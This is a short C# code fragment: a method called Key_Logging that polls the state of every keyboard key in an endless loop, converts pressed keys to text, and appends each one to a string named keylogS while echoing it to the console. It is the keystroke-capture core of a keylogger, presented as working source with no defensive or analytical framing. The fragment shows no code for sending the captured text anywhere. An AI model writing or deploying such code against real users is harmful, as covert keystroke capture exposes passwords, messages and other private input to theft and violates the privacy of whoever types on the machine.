            static void Key_Logging()
            {
                string newkey = "";
                while (true)
                {
                    //sleeping for while, this will reduce load on cpu
                    Thread.Sleep(50);
                    for (Int32 i = 0; i < 255; i++)
                    {
                        int keyState = GetAsyncKeyState(i);
                        if (keyState == 1 || keyState == -32767)
                        {
                            if ((i < 91) & (i > 47))
                            {
                                newkey = "" + (char)i;
                            }
                            else
                            {
                                switch (""+(Keys)i)
                                {
                                    case "Tab": newkey = "    "; break;
                                    case "Space": newkey = " "; break;
                                    case "Return": newkey = "\r\n"; break;
                                    case "OemMinus": newkey = "-"; break;
                                    case "Oemplus": newkey = "+"; break;
                                    case "OemQuestion": newkey = "/"; break;
                                    case "Oemtilde": newkey = "`"; break;
                                    default: newkey = "\"" + (Keys)i + "\""; break;
                                
                                }
                            }
                            Console.WriteLine(newkey);
                            keylogS += newkey;                            
                            break;
                        }
                    }
                }
            }
